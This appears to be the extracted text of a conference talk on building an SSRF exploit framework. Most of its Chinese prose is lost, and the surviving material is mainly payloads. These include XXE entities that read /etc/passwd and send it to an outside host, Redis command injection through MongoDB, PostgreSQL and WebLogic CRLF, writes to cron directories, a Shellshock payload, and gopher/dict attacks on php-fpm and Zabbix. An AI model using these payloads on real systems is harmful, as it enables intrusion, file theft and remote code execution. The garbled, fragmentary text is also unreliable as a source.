Build Your SSRF Exploit Framework SSRF


     @ringzero

KNOW IT  SSRF  SSRF  SSRF



HACK IT  SSRF    

HOW    SSRF  

KNOW IT, SSRF?

     Web Interface 

http://10.10.10.10:8080/manager/images/tomcat.gif

KNOW ITSSRF





 80 & 8080 

SSRF_Interface

Redis server HTTP server APP server

SSRF
 ( FingerPrint )        {Payload}  DOS(  Keep-Alive Always )   users / dirs / files 


SSRF Request













   

MongoDB

MemCache

Redis-Server

 



 









......100%
 OpenSSL   (Cookies & User:Pass) 

OpenSSL -- TSL

HELLO 



OpenSSL 
 

SSL

 

 -- 

 Cookies, USER & PASS
,?
!!!
 1024*
DOS

WEB SERVER

KNOW IT, SSRF
 SSRF  ( Upload from URL, Import & Export RSS feed)  (OracleMongoDBMSSQLPostgresCouchDB)  Webmail  (POP3/IMAP/SMTP)  (ffpmg, ImageMaic, DOCX, PDFXML)

 -> SSRF
 Upload from URL  Discuz!
 Import & Export RSS feed  Web Blog
 XML  Wordpress xmlrpc.php

XML -> SSRF

 XXE   DTD 
XML
 XLST -- XML

XSLT Template

XSLT Processor (Saxon)

Output Files

XML Fuzz Cheatsheet ()

 DTD Remote Access --  <!ENTITY % d SYSTEM "http://wuyun.org/evil.dtd">

 XML External Entity -- 

 XML Encryption -- XML 

<!ENTITY % file system "file:///etc/passwd" >

<xenc:AgreementMethod Algorithm= "http://wuyun.org/1">

<!ENTITY % d SYSTEM "http://wuyun.org/file?data=%file">

<xenc:EncryptionProperty Target= "http://wuyun.org/2">

<xenc:CipherReference URI= "http://wuyun.org/3">

 URL Invocation -- URL 

<xenc:DataReference URI= "http://wuyun.org/4">

<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://wuyun.org/urlin">

<roottag>test</roottag>

XML Fuzz Cheatsheet -- Web Services 
 XML Signature -- XML <Reference URI="http://wuyun.org/5">

 WS Policy -- SOA WS

<To xmlns="http://www.w3.org/2005/08/addressing">http://wuyun.org/to</To>

<ReplyTo xmlns="http://www.w3.org/2005/08/addressing">

<Address>http://wuyun.org/rto</Address>

</ReplyTo>

 WS Addressing -- Web Services 

 From WS Security -- JAVA WEB 

<input message="wooyun" wsa:Action="http://wuyun.org/ip" /> <output message="wooyun" wsa:Action="http://wuyun.org/op" />

<wsp:PolicyReference URI="http://wuyun.org/pr">

XML Fuzz Cheatsheet -- 

 WS Federation -- Web Services

<fed:Federation FederationID="http://wuyun.org/fid">

<fed:FederationInclude>http://wuyun.org/inc</fed:FederationInclude>

<fed:TokenIssuerName>http://wuyun.org/iss</fed:TokenIssuerName>

<mex:MetadataReference> <wsa:Address>http://wuyun.org/mex</wsa:Address>
</mex:MetadataReference>

 XBRL --  <xbrli:identifier scheme="http://wuyun.org/xbr"> <link:roleType roleURI="http://wuyun.org/role">

 ODATA (edmx) 

<edmx:Reference URI="http://wuyun.org/edmxr">

 STRATML -- 

<edmx:AnnotationsReference URI="http://wuyun.org/edmxa"> <stratml:Source>http://wuyun.org/stml</stratml:Source>

(MongoDB) -> SSRF
 
> db.copyDatabase('\r\nconfig set dbfilename wyssrf\r\nquit\r\n','test','10.6.4.166:6379')

[root@10-6-4-166 ~]# nc -l -vv 6379 Connection from 10.6.19.144 port 6379 [tcp/*] config set dbfilename wyssrf quit .system.namespaces

> db.copyDatabase(`helo','test','10.6.4.166:22'); {"errmsg" : "......helo.systemnamespaces failed: " }  > db.copyDatabase(`helo','test','10.6.4.166:9999'); {"errormsg" : "couldn't connect to server 10.6.4.166:9999"}

50000+MongoDB Server

(Oracle) -> SSRF
 UTL_HTTP  UTL_TCP  UTL_SMTP
http://docs.oracle.com/cd/E11882_01/appdev.112/e40758/u_http.htm

(PostgresSQL) -> SSRF
 dblink_send_query() 

SELECT dblink_send_query( `host=127.0.0.1 dbname=quit user=\'\r\nconfig set dbfilename wyssrf\r\n\quit\r\n' password=1 port=6379 sslmode=disable', 'select version();' );

 [root@localhost ~]# nc -l -vv 6379 Connection from 127.0.0.1 port 6379 [tcp/*] config set dbfilename wyssrf quit 

https://www.postgresql.org/docs/8.4/static/dblink.html

(MSSQL) -> SSRF

 OpenRowset()
SELECT openrowset('SQLOLEDB', 'server=192.168.1.5;uid=sa;pwd=sa;database=master')
 OpenDatasource()
SELECT * FROM OpenDatasource('SQLOLEDB',  'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories

:  XP_CMDSHELL

https://msdn.microsoft.com/zh-cn/library/ms190312.aspx

(CouchDB) -> SSRF
 HTTP API /_replicate
POST http://couchdb-server:5984/_replicate Content-Type: application/json Accept: application/json {
"source" : "recipes", "target" : "dict://redis.wuyun.org:6379/flushall", }
https://docs.couchdb.org/en/stable/api/server/common.html

Webmail  (POP3/IMAP/SMTP) -> SSRF
 QQ  163/126  

 -> SSRF

 FFmpeg concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd

 ImageMagick (mvg  URLHTTP) fill 'url(http://wyssrf.wuyun.org)'
 XML parsers ( XSLT ) XSLT  100  document(): xml include():  import(): 

 &  PDFDOCX 


HACK ITSSRF

HACK IT, SSRF & 

  {payload}
 ? IP (xip.ioIPIP)  (RedirectCRLF header injection)   (Protocols & Wrappers)


   XXE -> SSRF -> CSRF 

?

 URIDomain.tld url=http://www.10.10.10.10.xip.io (wooyun-2010-0162607 )
 10 / 172 / 192 / 127 IP  IP *256**3 + *256**2 + *256 IP 012.10.10.10 = 10.10.10.10
  startswith(`http')  302 Redirect  CRLF ( Ascii Code ) -- header injection

ASCII  %20 -> 0x20 ->  %23 -> 0x23 -> # %0d -> 0x0d -> CR \r %0a -> 0x0a-> LF \n %08 -> 0x08 -> BS %00 -> 0x00 -> Null Byte

SSRF -> 302

 302  http 
Discuz! SSRF

/forum.php?mod=ajax&action=downremoteimg&message= [img]http://wuyun.org/302.php?helo.jpg[/img]
302.php

HTTP Scheme - - - - > 
DICT Scheme

<?php header("Location: dict://wuyun.org:6379/set:1:helo"); # set 1 helo \n

http://www.wooyun.org/bugs/wooyun-2010-0215779

WebLogic SSRF HTTP  ()

 CRLF Header Injection HTTP
 WebLogic uddiexplorer SSRF 

POST /helo HTTP/1.1 Content-Type: text/xml; charset=UTF-8 User-Agent: Java1.6.0_11 Host: wuyun.org Connection: Keep-Alive

 http://localhost:7001/uddiexplorer/  SearchPublicRegistries.jsp?  operator=http://wuyun.org/helo&
rdoSearch=name&btnSubmit=Search
 CRLF ->ASCII Code

<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <env:Header></env:Header><env:Body>
<find_business generic="2.0" xmlns="urn:uddi-org:api_v2"> <name>%</name></find_business>
</env:Body></env:Envelope>

- %0d -> 0x0d-> \r 

- %0a -> 0x0a -> \n 

http://wuyun.org/helo%0d%0a

WebLogic SSRF  CRLF HTTP0-day

1

operator=http://wuyun.org/helo%20 HTTP/1.1 %0d%0a(\r\n) HOST: fuzz.wuyun.com %0d%0a(\r\n)

[root@wuyun.org ~]# nc -l 80 POST /helo HTTP/1.1 HOST: fuzz.wuyun.com User-Agent: Java1.6.0_11 Host: wuyun.org

2

operator=http://wuyun.org:6379/helo %0d%0a(\r\n) config set dir /etc/cron.d/ %0d%0a(\r\n) quit%0d%0a(\r\n)

[root@wuyun.org ~]# nc -l 6379 POST /helo config set dir /etc/cron.d/ quit HTTP/1.1

WebLogic SSRF 

operator=http://wuyun.org:21/

%08%08%08%08%08%08

%0d%0a

USER ftp

SHELLSHOCK

%0d%0a

POST /cgi-bin/test-cgi%0d%0a

PASS ftp

User-Agent: () { foo;};echo;/bin/ping cloudeye.me

%0d%0a

%0d%0a HTTP/1.1

pwd

%0d%0a

GET /abc%0d%0a



WebLogic SSRF  (FingerPrint)

 
weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: 'fuzz.wuyun.com', port: '88'

 
weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://www.baidu.com/ which did not have a valid SOAP content-type: text/html; charset=UTF-8.

 

 

weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://fuzz.wuyun.com:22/helo which did not have a valid SOAP content-type: null.

weblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://fuzz.wuyun.com:22 which did not have a valid SOAP content-type: null.

https://wap.ccb.com/uddi/uddilistener <dispositionReport generic="2.0" operator="http://11.168.100.21:7001">

DEMO : WebLogic SSRF CRLF + Redis

WebLogicSSRF

 80%   70%   &  90%

BEA & Oracle WebLogic 


SSRF -> Protocols & Wrappers

 Atlassian Confluence CVE-2015-8399
/spaces/viewdefaultdecorator.action?decoratorName=./WEB-INF/web.xml & /etc/passwd
/spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd
/spaces/viewdefaultdecorator.action?decoratorName=gopher://wuyun.org/_hi

 Resin-Doc 



/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=gopher://wuyun.org/_hi

SSRF -> Protocols & Wrappers

 PHP http://php.net/manual/en/wrappers.php
 Java sun.net.www.protocol.* file ftp gopher http https jar mailto netdoc

file:// -- Accessing local filesystem http:// -- Accessing HTTP(s) URLs ftp:// -- Accessing FTP(s) URLs php:// -- Accessing various I/O streams zlib:// -- Compression Streams data:// -- Data (RFC 2397) glob:// -- Find pathnames matching pattern phar:// -- PHP Archive ssh2:// -- Secure Shell 2 rar:// -- RAR expect:// -- Process Interaction Streams

SSRF -> 

HTTP 
GET /path HTTP/1.1 POST /path HTTP/1.1
WebDav: PUT MOVE DEL

UDP 
tftp://10.10.10.10/get helo
SMBreplay & BadTunnel
UNC Call: \\10.10.10.10\c$\boot.ini

FTP & SMTP & POP3

tftp ftp telnet dict ldap ldaps http file https ftps scp sftp

1 -> SSRF

 Tomcat Management  Zabbix Agentd  Nagios Agentd  Fastcgi ( php-fpm )

dict://localhost:8005/SHUTDOWN%0d%0a
dict://localhost:10050/vfs.file.regexp[/etc/hosts,7]  ZBXD?127.0.0.1 localhost dict://localhost:10050/system.run[ls] ZBXD,usr etc var boot
gopher://localhost:9000/_...[PHP_VALUE allow_url_include = On]...

 2 -> SSRF & 

 Redis  Memcached  CouchDB

REDIS6 1. www ,webshell 2. SSH authotrized_keys 3. (/var/spool/cron/ & /etc/cron.d/) 4. slave of 8.8.8.8  5. /etc/profile.d/  6. AOF appendfilename

SSRFMemcached
Sessionadminid= MemecachedJS/html...
 vBulletin  ( Memcached ) http://drops.wooyun.org/papers/8261
 Discuz ( Redis & Memcached ) http://www.wooyun.org/bugs/wooyun-2016-0213982 @Jannock

SSRFCouchDB
 SSRFHTTP /_replicate API  SSRFRestfulAPI  curl -X PUT 'http://1.1.1.1:5984/_config/query_servers/cmd' -d 
'"/sbin/ifconfig >/tmp/6666"'
15400 --> CouchDB

3 XXE -> SSRF -> CSRF 

 CoreMail IPAPI
 /apiws/services/API?wsdl
&

@Asuri

 CoreMailXML XXE SSRF
 SSRFAPI
http://www.wooyun.org/bugs/wooyun-2010-0192796
@applychen

...

HOW?


How 
 Python furl / requests / multiprocessing / time / re http://zone.wooyun.org/content/23255
   
   (http <GET|POST> dictgophertftp)



 
Keep-Alive: timeout=5 ftp://wuyun.org:6379  Keep-Alive http & dict://wuyun.org:6379 , 

/
 > db.copyDatabase(`helo','test','10.6.4.166:22'); {"errmsg" : "......helo.systemnamespaces failed: " }  > db.copyDatabase(`helo','test','10.6.4.166:6379'); {"errormsg" : "couldn't connect to server 10.6.4.166:6379"}

 
[root@localhost ~] # curl http://wuyun.org:22 SSH-2.0-OpenSSH_5.3 Protocol mismatch.

SITE : tangscan.com 
SSRF

jboss.py jdwp.py shellshock.py axis2.py jenkins.py smtp.py confluence.py struts2.py couchdb.py mongodb.py
tftp.py docker.py php_fastcgi.py

jboss invoker war java  bash axis2-adminServer jenkins scripts smtp  confluence ssrf(gopher) struts2  counchdb WEB API  mongodb SSRF tftpudp docker API php_fpm, fastcgi gopher

SHELL 

tomcat.py elasticsearch.py
pop.py webdav.py
ftp.py portscan.py websphere.py
gopher.py pstack.py zentaopms.py
hfs.py glassfish.py

tomcat /manager/html war ESGroovy pop3  WebDav PUT  ftp   WebSphere Adminwar gopher do anything Apache Hadoop  zentoPMS  HFS  glassfishwar

 SQLMAP 
python wyssrf.py config -u `http://wuyun.org/?url=qq.com' -p url

 SSRF      

